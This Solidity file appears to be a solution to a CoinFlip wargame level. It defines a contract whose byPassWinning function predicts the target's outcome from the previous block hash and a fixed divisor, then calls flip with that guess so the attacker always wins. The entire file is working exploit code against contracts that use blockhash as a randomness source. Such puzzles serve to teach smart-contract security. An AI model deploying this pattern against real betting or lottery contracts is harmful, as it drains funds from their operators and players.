// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { CoinFlip } from '../question/CoinFlip.sol';

contract CallCoinFlip {
    CoinFlip private flipContract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _address) {
        flipContract = CoinFlip(_address);
    }

    function byPassWinning() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlipResult = blockValue / FACTOR;
        bool side = coinFlipResult == 1 ? true : false;
        flipContract.flip(side);   
    }
}